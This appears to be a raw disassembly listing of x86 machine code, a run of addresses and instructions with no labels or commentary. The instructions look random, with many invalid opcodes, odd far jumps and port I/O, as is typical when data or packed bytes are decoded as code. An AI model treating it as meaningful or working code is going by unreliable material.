  41272f:	dec    DWORD PTR [ebx+ebx*1-0x18]
  412733:	out    dx,eax
  412734:	jecxz  0x412773
  412736:	and    eax,0x25c03612
  41273b:	push   esi
  41273c:	jmp    0x41270c
  41273e:	mov    bh,0xf3
  412740:	int    0xe6
  412742:	or     eax,0x59f31254
  412747:	mov    dh,0xa6
  412749:	mov    cl,0x71
  41274b:	sbb    DWORD PTR [ebx-0x43],esi
  41274e:	mov    WORD PTR [ebp+0x5412e702],cs
  412754:	xlat   BYTE PTR ds:[ebx]
  412755:	dec    edx
  412756:	je     0x412704
  412758:	js     0x4127b0
  41275a:	call   0x21b0:0x407fc4b1
  412761:	jmp    0xff12:0xc5d0e850
  412768:	xor    dl,dh
  41276a:	cld    
  41276b:	pop    esi
  41276c:	int    0xc4
  41276e:	inc    ebp
  41276f:	sub    BYTE PTR cs:[edi+0x7be543b2],bl
  412776:	push   ebp
  412777:	or     eax,edx
  412779:	je     0x41273c
  41277b:	dec    ebx
  41277c:	or     dl,BYTE PTR [eax]
  41277e:	fs out 0x25,eax
  412781:	daa    
  412782:	mov    ecx,0x36e4ca18
  412787:	and    eax,0x5abeb1c6
  41278c:	xor    BYTE PTR ds:0x142095d8,bh
  412792:	rep outs dx,DWORD PTR ds:[esi]
  412794:	push   edx
  412795:	adc    DWORD PTR [esi-0x58e192e6],ebx
  41279b:	dec    eax
  41279c:	(bad)  
  41279d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41279e:	push   es
  41279f:	pushf  
  4127a0:	call   DWORD PTR [ebx-0x422a9655]
  4127a6:	dec    eax
  4127a7:	pop    edx
  4127a8:	test   DWORD PTR ds:0x393ae139,esp
  4127ae:	cs jl  0x41277d
  4127b1:	(bad)  
  4127b2:	pop    ss
  4127b3:	mov    WORD PTR [ebp+0x6],?
  4127b6:	jbe    0x4127f9
  4127b8:	xor    ch,BYTE PTR [edi]
  4127ba:	fwait
  4127bb:	xchg   esp,eax
  4127bc:	retf   0xac46
  4127bf:	push   ebp
  4127c0:	mov    esp,0xed6ca283
  4127c5:	mov    ds:0x3a06d627,eax
  4127ca:	mov    ds:0xad4ecc97,eax
  4127cf:	or     BYTE PTR [edx],al
  4127d1:	xor    DWORD PTR [esi-0x5e],ecx
  4127d4:	ret    
  4127d5:	inc    ebx
  4127d6:	aaa    
  4127d7:	in     eax,dx
  4127d8:	jecxz  0x412808
  4127da:	mov    ebp,0x7e39f23
  4127df:	popf   
  4127e0:	hlt    
  4127e1:	into   
  4127e2:	cwde   
  4127e3:	xchg   esp,eax
  4127e4:	xor    DWORD PTR [edx-0xe],ebp
  4127e7:	jb     0x41284e
  4127e9:	cmp    dh,BYTE PTR ds:0xb998bdb3
  4127ef:	xchg   ebp,eax
  4127f0:	call   0x51a4590b
  4127f5:	fld    QWORD PTR [edi-0x2a1fec34]
  4127fb:	in     al,0x2
  4127fd:	push   0xfffffff1
  4127ff:	pop    ebx
  412800:	push   cs
  412801:	aas    
  412802:	mov    bh,BYTE PTR [ecx-0x4549dee8]
  412808:	xchg   ebx,eax
  412809:	sub    al,0x7
  41280b:	xlat   BYTE PTR ds:[ebx]
  41280c:	mov    al,0xa2
  41280e:	xchg   esi,eax
  41280f:	adc    eax,ebx
  412811:	or     esp,0xffffffa0
  412814:	jecxz  0x4127e2
  412816:	mov    cl,0x32
  412818:	into   
  412819:	xor    BYTE PTR [ecx],0xc6
  41281c:	inc    esp
  41281d:	xchg   BYTE PTR [eax],cl
  41281f:	mov    WORD PTR [ebp+0x2f],es
  412822:	mov    ebx,esi
  412824:	jae    0x412874
  412826:	xor    edi,DWORD PTR [edi+0x20]
  412829:	scas   al,BYTE PTR es:[edi]
  41282a:	xchg   edi,eax
  41282b:	test   DWORD PTR [esi-0x69d1149a],edx
  412831:	add    edx,esp
  412833:	mov    dh,0xbf
  412835:	ret    0x7af2
  412838:	inc    eax
  412839:	fadd   DWORD PTR [ebx-0xf3c38f]
  41283f:	std    
  412840:	stos   DWORD PTR es:[edi],eax
  412841:	cmp    esi,esp
  412843:	mov    al,ds:0x96f7f8ab
  412848:	cmp    BYTE PTR [ecx],ch
  41284a:	imul   ebp,DWORD PTR [ebx-0x31feaeac],0xffffffe0
  412851:	cwde   
  412852:	imul   edx,esp,0xfffffffa
  412855:	jno    0x412839
  412857:	hlt    
  412858:	aad    0x87
  41285a:	add    DWORD PTR [ecx-0x6b],edx
  41285d:	dec    ebx
  41285e:	sbb    al,BYTE PTR [ecx-0x56de7135]
  412864:	mov    al,ds:0x7c2a4115
  412869:	push   esp
  41286a:	jbe    0x412833
  41286c:	ja     0x41280b
  41286e:	and    BYTE PTR [ecx],al
  412870:	iret   
  412871:	popf   
  412872:	test   al,0x74
  412874:	in     al,0x6
  412876:	addr16 dec edi
  412878:	leave  
  412879:	xor    BYTE PTR [ebx+0x59c0ef6a],ch
  41287f:	push   edi
  412880:	or     DWORD PTR [eax+0x2c5f4f8c],edx
  412886:	fwait
  412887:	iret   
  412888:	cwde   
  412889:	jge    0x4128d3
  41288b:	sar    eax,0x19
  41288e:	push   esi
  41288f:	mov    edx,0xd01560e3
  412894:	test   eax,0xfe3d203c
  412899:	enter  0x484,0x21
  41289d:	pop    eax
  41289e:	outs   dx,BYTE PTR ds:[esi]
  41289f:	ja     0x41288d
  4128a1:	inc    esp
  4128a2:	xchg   DWORD PTR [ebx],edi
  4128a4:	and    DWORD PTR [edx+eiz*8-0x57],ebx
  4128a8:	and    DWORD PTR [ebp+0x7c3b8a40],ecx
  4128ae:	mov    cs,WORD PTR [ebx-0x12d68386]
  4128b4:	das    
  4128b5:	pusha  
  4128b6:	sub    ebp,DWORD PTR [esi-0x2db19eeb]
  4128bc:	mov    DWORD PTR [ecx-0x27],ebx
  4128bf:	ins    DWORD PTR es:[edi],dx
  4128c0:	loop   0x4128b3
  4128c2:	push   cs
  4128c3:	aas    
  4128c4:	and    eax,0x4f85429d
  4128c9:	push   ebp
  4128ca:	(bad)  
  4128cb:	mov    esi,0xcac794c
  4128d0:	jns    0x412853
  4128d2:	(bad)  
  4128d3:	je     0x4128e7
  4128d5:	mov    al,ds:0x3ffa1d1a
  4128da:	push   es
  4128db:	pop    edi
  4128dc:	ror    BYTE PTR [esi+0x630bb6f7],cl
  4128e2:	pop    eax
  4128e3:	in     eax,0xf2
  4128e5:	push   esi
  4128e6:	sbb    edi,DWORD PTR [edx]
  4128e8:	dec    ecx
  4128e9:	js     0x41289e
  4128eb:	xor    ebx,ecx
  4128ed:	stos   BYTE PTR es:[edi],al
  4128ee:	pop    ecx
  4128ef:	mov    BYTE PTR [edi-0xd],cl
  4128f2:	fcom   st(7)
  4128f4:	(bad)  
  4128f5:	fsub   QWORD PTR [ecx]
  4128f7:	jae    0x4128f3
  4128f9:	icebp  
  4128fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128fb:	das    
  4128fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128fd:	sbb    eax,0xf22e593f
  412902:	loope  0x412958
  412904:	retf   0xa91b
  412907:	ja     0x412924
  412909:	jo     0x41295c
  41290b:	and    BYTE PTR [ebx+0x204825ba],dh
  412911:	dec    ebx
  412912:	scas   al,BYTE PTR es:[edi]
  412913:	mov    bh,0xbb
  412915:	adc    eax,0x8012d09e
  41291b:	ret    
  41291c:	fs push edi
  41291e:	fld    TBYTE PTR [eax+edx*2]
  412921:	dec    ebx
  412922:	or     DWORD PTR [ebx],eax
  412924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412925:	adc    eax,0x220aa0cf
  41292a:	push   0xffffffb7
  41292c:	add    DWORD PTR ds:0xb68a4238,0x4dbed0ee
  412936:	push   ecx
  412937:	in     al,dx
  412938:	mov    esp,0x76afae54
  41293d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41293e:	addr16 adc eax,0x604ec789
  412944:	push   ebx
  412945:	add    eax,0xaebdfd38
  41294a:	push   ebx
  41294b:	dec    ecx
  41294c:	aaa    
  41294d:	imul   eax,DWORD PTR [ebx],0x24
  412950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412951:	idiv   BYTE PTR [ebx+0x362417c6]
  412957:	cmp    ah,BYTE PTR [ebp+0x79b4a09a]
  41295d:	dec    ebx
  41295e:	sbb    eax,0xd2132dc9
  412963:	sub    dh,dh
  412965:	add    ah,BYTE PTR [esi]
  412967:	xor    eax,0xe05b658d
  41296c:	arpl   si,si
  41296e:	jbe    0x41297d
  412970:	xor    BYTE PTR [edi-0x16f2a2f4],ah
  412976:	lahf   
  412977:	or     BYTE PTR [esi+eiz*4],cl
  41297a:	push   ds
  41297b:	or     al,0xa3
  41297d:	mov    esp,0xc597c6c1
  412982:	lahf   
  412983:	rol    DWORD PTR [ecx+0x158afc21],1
  412989:	sbb    DWORD PTR [edx],0x946947a0
  41298f:	jno    0x4129a7
  412991:	and    eax,DWORD PTR [ebp-0x1d57b31]
  412997:	retf   0x9658
  41299a:	mov    BYTE PTR ds:0xfc3a797e,0x9a
  4129a1:	sbb    bh,BYTE PTR [ebx]
  4129a3:	loopne 0x4129af
  4129a5:	in     al,dx
  4129a6:	adc    eax,0x55691123
  4129ab:	jae    0x4129ce
  4129ad:	adc    bl,0xb7
  4129b0:	aaa    
  4129b1:	in     al,0xc9
  4129b3:	sbb    bl,BYTE PTR [eax-0x8]
  4129b6:	mov    WORD PTR [ebx+0x5a29cbcc],?
  4129bc:	retf   0xa5d7
  4129bf:	pop    edi
  4129c0:	xor    eax,0xfc693ade
  4129c5:	cmp    DWORD PTR fs:[esi],ebx
  4129c8:	stc    
  4129c9:	mov    esp,DWORD PTR [edi-0x77]
  4129cc:	cmp    dh,BYTE PTR [ecx-0x8]
  4129cf:	imul   edi,DWORD PTR [edx+0x64],0x680a9477
  4129d6:	inc    esp
  4129d7:	and    eax,0xf9b1b70b
  4129dc:	cdq    
  4129dd:	ss cmp esp,ebx
  4129e0:	xor    ebx,DWORD PTR [ecx-0xa]
  4129e3:	sub    al,dl
  4129e5:	loop   0x4129da
  4129e7:	push   ds
  4129e8:	mov    edi,0xf174e16b
  4129ed:	hlt    
  4129ee:	ret    
  4129ef:	out    dx,eax
  4129f0:	push   esi
  4129f1:	adc    eax,0xf56f096e
  4129f6:	test   DWORD PTR [ecx+esi*8+0x54fe001b],edi
  4129fd:	paddsw mm1,QWORD PTR [eax-0x4]
  412a01:	fwait
  412a02:	add    esi,DWORD PTR [edx]
  412a04:	and    dl,BYTE PTR [ebx]
  412a06:	icebp  
  412a07:	add    DWORD PTR [ecx],esi
  412a09:	stos   BYTE PTR es:[edi],al
  412a0a:	mov    eax,ds:0x703bae02
  412a0f:	clc    
  412a10:	jl     0x4129df
  412a12:	cmp    ebp,DWORD PTR [eax+0x7c4a8627]
  412a18:	fiadd  DWORD PTR [ebx-0x41]
  412a1b:	nop
  412a1c:	das    
  412a1d:	retf   0x1097
  412a20:	mov    ah,0x1c
  412a22:	loopne 0x4129c8
  412a24:	push   0x52
  412a26:	shl    ebx,0xb6
  412a29:	pop    edx
  412a2a:	mov    eax,0x324ae00a
  412a2f:	mov    bl,0xe8
  412a31:	fimul  DWORD PTR [esi]
  412a33:	popf   
  412a34:	mov    dh,0xb8
  412a36:	inc    eax
  412a37:	sub    BYTE PTR [ecx],bh
  412a39:	lds    edi,FWORD PTR [ebp-0x1a]
  412a3c:	leave  
  412a3d:	bound  ecx,QWORD PTR [eax]
  412a3f:	push   ebp
  412a40:	cs jnp 0x412a03
  412a43:	and    cl,BYTE PTR [ecx-0x1813fd59]
  412a49:	sbb    esi,edi
  412a4b:	push   edi
  412a4c:	pusha  
  412a4d:	sbb    ah,dh
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	ss addr16 mov ebp,0x475b30b
  412a57:	(bad)  
  412a58:	push   ds
  412a59:	adc    BYTE PTR ds:[ebp+0x20],dl
  412a5d:	xchg   ecx,ecx
  412a5f:	pop    es
  412a60:	mov    ds:0x3e232788,eax
  412a65:	call   0xcdea:0x716aa62f
  412a6c:	adc    edi,ebp
  412a6e:	(bad)  
  412a70:	mov    WORD PTR [ebx+0x6b],fs
  412a73:	or     DWORD PTR [ebp-0x2ea64824],0x2f3f493c
  412a7d:	pop    esp
  412a7e:	push   ebx
  412a7f:	adc    eax,0x484a6548
  412a84:	dec    ebp
  412a85:	rcr    DWORD PTR [ebp-0x4e711ac],1
  412a8b:	call   0xc0d1e296
  412a90:	xor    BYTE PTR [eax-0x5],cl
  412a93:	and    eax,0xdd3307d1
  412a98:	mov    edx,0xc2d0a65f
  412a9d:	mov    dl,BYTE PTR [ebp*2+0x3ee65039]
  412aa4:	sub    al,0xaa
  412aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aa7:	pop    ebx
  412aa8:	pop    ss
  412aa9:	xchg   DWORD PTR [edx],edi
  412aab:	gs call 0x98b83434
  412ab1:	test   al,0x1e
  412ab3:	jmp    0xc06dfa65
  412ab8:	out    0x8c,eax
  412aba:	mov    ebp,0x433ab4f
  412abf:	jl     0x412a54
  412ac1:	push   ebx
  412ac2:	and    ebp,DWORD PTR [esi-0x23]
  412ac5:	bnd call 0xce333f42
  412acb:	addr16 inc ebp
  412acd:	popf   
  412ace:	sub    ecx,DWORD PTR [eax+0x5162297a]
  412ad4:	push   cs
  412ad5:	cmp    bl,BYTE PTR [ebx-0x71]
  412ad8:	cs (bad) 
  412ada:	or     DWORD PTR es:0x22e19d86,ebp
  412ae1:	pop    ds
  412ae2:	enter  0x13d0,0x69
  412ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ae7:	adc    DWORD PTR ds:0x11239250,edx
  412aed:	sbb    eax,0xb03e730e
  412af2:	mov    al,0xda
  412af4:	sub    esi,DWORD PTR [esi+ebp*1+0x76]
  412af8:	test   DWORD PTR [ecx-0x34],esi
  412afb:	xchg   ebp,eax
  412afc:	and    DWORD PTR [edx+edi*1],0xefee788d
  412b03:	aas    
  412b04:	mov    ah,0x62
  412b06:	js     0x412b49
  412b08:	sar    al,0xaa
  412b0b:	and    eax,0x6ae36434
  412b10:	lods   al,BYTE PTR ds:[esi]
  412b11:	jo     0x412b2b
  412b13:	mov    dl,0x2d
  412b15:	xlat   BYTE PTR ds:[ebx]
  412b16:	adc    ch,BYTE PTR [ebx+0x6bc689c5]
  412b1c:	xor    al,0x93
  412b1e:	sahf   
  412b1f:	pushf  
  412b20:	pop    edi
  412b21:	mov    edx,0xf2ec843e
  412b26:	add    al,0x9c
  412b28:	into   
  412b29:	fxch   st(0)
  412b2b:	mov    BYTE PTR ds:0xf43bc727,dl
  412b31:	mov    al,ds:0x2731e584
  412b36:	fld    QWORD PTR [ebx+0x69]
  412b39:	inc    edi
  412b3a:	out    dx,al
  412b3b:	mov    ebp,0x20ff0354
  412b40:	mov    bl,0xde
  412b42:	pop    ecx
  412b43:	test   dh,dh
  412b45:	or     bl,BYTE PTR [edi]
  412b47:	lahf   
  412b48:	and    eax,0x57154205
  412b4d:	push   0x30
  412b4f:	and    al,0x21
  412b51:	jecxz  0x412b62
  412b53:	dec    ebx
  412b54:	xchg   edx,ebx
  412b56:	sub    bh,BYTE PTR [eax-0x5]
  412b59:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  412b5b:	xor    ecx,esp
  412b5d:	hlt    
  412b5e:	xor    ebp,ebp
  412b60:	sbb    eax,0x1b6b1152
  412b65:	jp     0x412aed
  412b67:	scas   al,BYTE PTR es:[edi]
  412b68:	hlt    
  412b69:	or     al,0x16
  412b6b:	sar    BYTE PTR [esi+0x250d367a],0x64
  412b72:	pop    ebx
  412b73:	xor    DWORD PTR [ecx],esp
  412b75:	test   BYTE PTR [esp+ebx*4-0x30],dh
  412b79:	repnz nop
  412b7b:	push   es
  412b7c:	cs sbb al,0x2a
  412b7f:	add    ebp,esi
  412b81:	mov    ch,0x31
  412b83:	(bad)  
  412b84:	xor    ecx,DWORD PTR [edi-0x3eb721d]
  412b8a:	sub    ch,0xfb
  412b8d:	ficom  WORD PTR [edi]
  412b8f:	mov    dh,BYTE PTR [esi+edi*4-0x43a97c0d]
  412b96:	add    edx,ebp
  412b98:	cld    
  412b99:	test   al,0xf7
  412b9b:	les    ebp,FWORD PTR [esi+0x5b]
  412b9e:	or     BYTE PTR [eax+0x3a],cl
  412ba1:	cmp    ecx,DWORD PTR [edx-0x63011806]
  412ba7:	lds    ebx,FWORD PTR [ecx]
  412ba9:	mov    edi,0xc309d327
  412bae:	push   eax
  412baf:	test   eax,0x28cd7fe7
  412bb4:	adc    DWORD PTR [edi-0x1a2de476],ecx
  412bba:	dec    edi
  412bbb:	cmp    DWORD PTR ds:0x591ffd8f,edi
  412bc1:	push   ebp
  412bc2:	loopne 0x412c0f
  412bc4:	and    cl,al
  412bc6:	pop    esi
  412bc7:	xchg   ecx,eax
  412bc8:	ins    BYTE PTR es:[edi],dx
  412bc9:	fld    TBYTE PTR [ebx-0x12]
  412bcc:	shl    BYTE PTR [edi-0x36],0xb1
  412bd0:	push   esp
  412bd1:	shr    BYTE PTR [ebx],1
  412bd3:	pop    ebp
  412bd4:	or     al,0xe3
  412bd6:	add    DWORD PTR [ebp+0x7f31334d],ebx
  412bdc:	out    0x6d,eax
  412bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bdf:	scas   al,BYTE PTR es:[edi]
  412be0:	out    0x7,al
  412be2:	and    al,0x39
  412be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be5:	and    ecx,DWORD PTR [ecx]
  412be7:	mov    ds:0xcc6a6f4b,al
  412bec:	inc    eax
  412bed:	jbe    0x412bb7
  412bef:	push   ss
  412bf0:	hlt    
  412bf1:	jp     0x412c0d
  412bf3:	stos   DWORD PTR es:[edi],eax
  412bf4:	sub    ecx,DWORD PTR [edx+ecx*8-0x71]
  412bf8:	mov    bl,0x7c
  412bfa:	gs loop 0x412bf2
  412bfd:	loop   0x412c59
  412bff:	das    
  412c00:	fidiv  WORD PTR [ebx]
  412c02:	jno    0x412bf1
  412c04:	xchg   esi,eax
  412c05:	push   edi
  412c06:	and    eax,0xbad65e7a
  412c0b:	xor    BYTE PTR [esi-0x57e5aacd],ah
  412c11:	jge    0x412c37
  412c13:	test   BYTE PTR [ecx-0x69bf2939],cl
  412c19:	jl     0x412c07
  412c1b:	lods   eax,DWORD PTR ds:[esi]
  412c1c:	dec    ebp
  412c1d:	imul   edi,DWORD PTR [eax],0x68
  412c20:	imul   esi,esi,0xe0552bc0
  412c26:	stc    
  412c27:	jecxz  0x412bc2
  412c29:	sub    BYTE PTR [edi+0xa],ah
  412c2c:	mov    esp,0xed143b8a
  412c31:	inc    ebp
  412c32:	mov    ch,0xc5
  412c34:	and    eax,0x7d39936e
  412c39:	jle    0x412ca9
  412c3b:	cmc    
  412c3c:	jo     0x412be6
  412c3e:	or     ebx,DWORD PTR [edi]
  412c40:	push   0x1f519a75
  412c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c46:	pop    esp
  412c47:	mov    ch,0x83
  412c49:	inc    ebx
  412c4a:	jbe    0x412ca5
  412c4c:	xchg   esp,eax
  412c4d:	dec    ebx
  412c4e:	mov    bh,0x69
  412c50:	or     eax,0xb7eab79a
  412c55:	xchg   DWORD PTR [ebx+ebp*2+0x51],ebx
  412c59:	mov    ebx,0x7187f652
  412c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c5f:	add    BYTE PTR [edx],dh
  412c61:	add    eax,0xe5d5db4a
  412c66:	ss dec ebp
  412c68:	xchg   esi,eax
  412c69:	out    0xf7,eax
  412c6b:	gs (bad) 
  412c6d:	adc    DWORD PTR [esi+0x73],ecx
  412c70:	add    edi,DWORD PTR [eax]
  412c72:	and    al,0xb6
  412c74:	je     0x412cdd
  412c76:	jbe    0x412c2b
  412c78:	or     DWORD PTR [ebx-0x4554049c],eax
  412c7e:	fnstcw WORD PTR ds:0xec0dd16a
  412c84:	test   DWORD PTR ds:0x7365362,esi
  412c8a:	outs   dx,BYTE PTR ds:[esi]
  412c8b:	fwait
  412c8c:	inc    eax
  412c8d:	xchg   esp,eax
  412c8e:	xchg   BYTE PTR [edi+0x38],cl
  412c91:	push   ebp
  412c92:	pop    ecx
  412c93:	jns    0x412c67
  412c95:	sub    edi,esp
  412c97:	xor    al,0x4e
  412c99:	jns    0x412c21
  412c9b:	inc    esp
  412c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9d:	das    
  412c9e:	jbe    0x412c3e
  412ca0:	int    0xd9
  412ca2:	lods   eax,DWORD PTR ds:[esi]
  412ca3:	outs   dx,DWORD PTR ds:[esi]
  412ca4:	loope  0x412c37
  412ca6:	dec    ecx
  412ca7:	into   
  412ca8:	aam    0xc2
  412caa:	mov    edi,0x61e7f146
  412caf:	mov    eax,0xbe481af9
  412cb4:	sbb    al,0xd8
  412cb6:	pop    es
  412cb7:	retf   
  412cb8:	mov    edx,0x46b427f8
  412cbd:	or     esp,edi
  412cbf:	push   0xefc630ff
  412cc4:	aad    0x22
  412cc6:	shl    edi,cl
  412cc8:	stos   DWORD PTR es:[edi],eax
  412cc9:	fadd   DWORD PTR [edi-0x7d5213d6]
  412ccf:	xchg   esp,eax
  412cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cd1:	jmp    0xc844:0xa06fd3bd
  412cd8:	nop
  412cd9:	loop   0x412d16
  412cdb:	aam    0xd6
  412cdd:	adc    eax,0x77eafc16
  412ce2:	jns    0x412cd6
  412ce4:	push   ds
  412ce5:	cmp    DWORD PTR [edi],edx
  412ce7:	dec    ebx
  412ce8:	arpl   WORD PTR [eax-0x4a],sp
  412ceb:	in     eax,dx
  412cec:	jmp    0x86ff14bc
  412cf1:	push   ds
  412cf2:	in     eax,0x18
  412cf4:	add    eax,DWORD PTR [ebx]
  412cf6:	rol    DWORD PTR ds:0xde0490e7,0x79
  412cfd:	loope  0x412d5b
  412cff:	or     al,0xd6
  412d01:	adc    BYTE PTR [ecx-0x39],0x3d
  412d05:	sub    al,0x2b
  412d07:	call   0xd464:0xfe4cef9c
  412d0e:	mov    ah,0x5b
  412d10:	pop    ds
  412d11:	out    0x84,al
  412d13:	pop    esp
  412d14:	in     al,0x2a
  412d16:	loopne 0x412cc9
  412d18:	in     eax,0xa5
  412d1a:	pop    es
  412d1b:	in     eax,dx
  412d1c:	push   ebx
  412d1d:	push   cs
  412d1e:	dec    ebp
  412d1f:	call   0xcbac:0xdcd7a88a
  412d26:	mov    ah,0x7b
  412d28:	out    0x11,eax
  412d2a:	push   ebx
  412d2b:	push   esp
  412d2c:	aad    0xe5
  412d2e:	push   ecx
  412d2f:	sub    esi,esp
  412d31:	mov    ecx,0xe2448b42
  412d36:	das    
  412d37:	(bad)  [edx-0xd1acf13]
  412d3d:	(bad)  
  412d3e:	dec    esi
  412d3f:	push   ss
  412d40:	ins    DWORD PTR es:[edi],dx
  412d41:	pop    ds
  412d42:	sbb    al,0x13
  412d44:	push   ds
  412d45:	pop    ecx
  412d46:	mov    ecx,0x4c6523cf
  412d4b:	xchg   esi,eax
  412d4c:	push   esp
  412d4d:	mov    ah,0x4d
  412d4f:	and    BYTE PTR [ecx],dl
  412d51:	(bad)  
  412d52:	(bad)  
  412d53:	jl     0x412d60
  412d55:	xchg   ebx,eax
  412d56:	jecxz  0x412da8
  412d58:	and    esi,DWORD PTR [ebx+0x78eb523]
  412d5e:	xchg   ebx,eax
  412d5f:	jecxz  0x412d35
  412d61:	mov    ds:0x7767b22e,al
  412d66:	ds mov eax,0xbd63ab7
  412d6c:	lock or DWORD PTR [edi+0x7e],ebp
  412d70:	jmp    0x635f75cf
  412d75:	cwde   
  412d76:	dec    ecx
  412d77:	icebp  
  412d78:	push   ss
  412d79:	add    DWORD PTR [edx+edx*8-0x74641bf],0xffffffa5
  412d81:	xor    al,0x99
  412d83:	inc    edx
  412d84:	mov    bl,0xdb
  412d86:	ror    DWORD PTR [edx-0x3723d330],0x8e
  412d8d:	cdq    
  412d8e:	std    
  412d8f:	xchg   esi,eax
  412d90:	enter  0x6c0b,0x16
  412d94:	ret    0x11b3
  412d97:	lds    esi,FWORD PTR [edx+0x50]
  412d9a:	test   DWORD PTR [eax+0x22a49d0c],esp
  412da0:	push   0x94374a46
  412da5:	mov    eax,0x7d15dfd2
  412daa:	cmp    BYTE PTR [edi-0x7d],dl
  412dad:	cmp    eax,0x73090f65
  412db2:	popa   
  412db3:	mov    bh,dl
  412db5:	(bad)  
  412db6:	mov    ?,WORD PTR [edi-0x4]
  412db9:	cmp    edi,DWORD PTR [ebx]
  412dbb:	jne    0x412ddf
  412dbd:	xchg   edi,eax
  412dbe:	mov    ebp,0xe88a2d30
  412dc3:	fbstp  TBYTE PTR es:[eax+0x77a33309]
  412dca:	outs   dx,DWORD PTR ds:[esi]
  412dcb:	inc    ebp
  412dcc:	xchg   esp,eax
  412dcd:	outs   dx,DWORD PTR ds:[esi]
  412dce:	outs   dx,BYTE PTR ds:[esi]
  412dcf:	clc    
  412dd0:	push   esi
  412dd1:	stos   DWORD PTR es:[edi],eax
  412dd2:	sub    eax,0xef6e35d
  412dd7:	loopne 0x412e4b
  412dd9:	fld    TBYTE PTR [ebx]
  412ddb:	cmp    BYTE PTR [ebx-0x79],0xf1
  412ddf:	stos   DWORD PTR es:[edi],eax
  412de0:	add    eax,0xe79ff9d0
  412de5:	push   ebx
  412de6:	out    0x99,al
  412de8:	outs   dx,BYTE PTR ds:[esi]
  412de9:	cwde   
  412dea:	push   ecx
  412deb:	add    edx,DWORD PTR [eax-0x40a91ca3]
  412df1:	and    dh,BYTE PTR [edi+0x59ef4528]
  412df7:	es jae 0x412d83
  412dfa:	(bad)  
  412dfb:	stos   BYTE PTR es:[edi],al
  412dfc:	jo     0x412e1a
  412dfe:	mov    DWORD PTR [ebx],0x2645e845
  412e04:	jne    0x412dd5
  412e06:	jmp    0x1c3d:0x5f93f5e6
  412e0d:	xchg   esp,eax
  412e0e:	lock cdq 
  412e10:	dec    BYTE PTR [ebx+0x6b]
  412e13:	imul   esp,DWORD PTR [eax+0xe8463ef],0x87cfe85d
  412e1d:	out    dx,al
  412e1e:	sub    eax,0x713e58fe
  412e23:	inc    eax
  412e24:	rcl    DWORD PTR [ecx+0x39],1
  412e27:	in     al,0x65
  412e29:	or     dl,BYTE PTR [ebx]
  412e2b:	xor    bl,ch
  412e2d:	jo     0x412e4e
  412e2f:	mov    al,0x8f
  412e31:	aam    0x36
  412e33:	jge    0x412e54
  412e35:	cmp    DWORD PTR [edx+0x54],0x56
  412e39:	xlat   BYTE PTR ds:[ebx]
  412e3a:	outs   dx,BYTE PTR ds:[esi]
  412e3b:	xchg   esi,eax
  412e3c:	int3   
  412e3d:	xor    al,0x38
  412e3f:	mov    bl,0x1
  412e41:	adc    edi,esp
  412e43:	lods   eax,DWORD PTR ds:[esi]
  412e44:	mov    WORD PTR [ebx-0xd],ss
  412e47:	aaa    
  412e48:	fwait
  412e49:	mov    ebx,0xe5e3fad3
  412e4e:	jge    0x412e2b
  412e50:	and    cl,dh
  412e52:	ficom  DWORD PTR [ecx]
  412e54:	(bad)  
  412e55:	mov    eax,ds:0x74961dab
  412e5a:	rcr    BYTE PTR [eax+0x57],0x1f
  412e5e:	inc    ecx
  412e5f:	mov    ds:0xb4276300,al
  412e64:	mov    BYTE PTR [esi+esi*8+0x3977ffc1],al
  412e6b:	sbb    DWORD PTR [esi+0x3b],eax
  412e6e:	loop   0x412ecd
  412e70:	jb     0x412e20
  412e72:	xchg   edi,eax
  412e73:	cmp    BYTE PTR [esi+0x522fa631],0xa0
  412e7a:	mov    esi,0x85f4ee50
  412e7f:	fist   WORD PTR [edx]
  412e81:	cmc    
  412e82:	sbb    eax,0xa040acaa
  412e87:	mov    ah,0xb6
  412e89:	rol    DWORD PTR [ebx-0x65],cl
  412e8c:	out    dx,eax
  412e8d:	pusha  
  412e8e:	(bad)  
  412e8f:	std    
  412e90:	pop    ecx
  412e91:	dec    edi
  412e92:	cpuid  
  412e94:	sti    
  412e95:	and    eax,0xebe192cc
  412e9a:	dec    eax
  412e9b:	jno    0x412e27
  412e9d:	sbb    eax,0xbf981f92
  412ea2:	pop    ecx
  412ea3:	inc    ecx
  412ea4:	mov    esi,0x85b37c04
  412ea9:	and    ebp,eax
  412eab:	shl    DWORD PTR [esi],cl
  412ead:	xchg   ax,ax
  412eaf:	in     eax,dx
  412eb0:	fadd   QWORD PTR [ebx-0x365ac3a1]
  412eb6:	fstp   QWORD PTR [ebx+0x6f844575]
  412ebc:	call   0xea73:0xe8093d21
  412ec3:	add    ebp,DWORD PTR [eax]
  412ec5:	mov    dh,0x65
  412ec7:	lock retf 0x81f9
  412ecb:	outs   dx,BYTE PTR ds:[esi]
  412ecc:	jp     0x412e54
  412ece:	das    
  412ecf:	pop    esi
  412ed0:	xor    al,0xc4
  412ed2:	push   ss
  412ed3:	xchg   edi,eax
  412ed4:	and    esi,esi
  412ed6:	mov    ds:0x917134ba,al
  412edb:	in     eax,0x8e
  412edd:	dec    ebp
  412ede:	rol    BYTE PTR [eax+0x6],cl
  412ee1:	shl    BYTE PTR [edx],0x52
  412ee4:	or     dl,cl
  412ee6:	pop    ecx
  412ee7:	shl    eax,1
  412ee9:	push   ds
  412eea:	int    0xce
  412eec:	je     0x412e99
  412eee:	push   ecx
  412eef:	mov    es,WORD PTR [ebx-0x20]
  412ef2:	fiadd  DWORD PTR [esi]
  412ef4:	jl     0x412ee1
  412ef6:	mov    edi,0x85f73ddf
  412efb:	scas   al,BYTE PTR es:[edi]
  412efc:	out    dx,eax
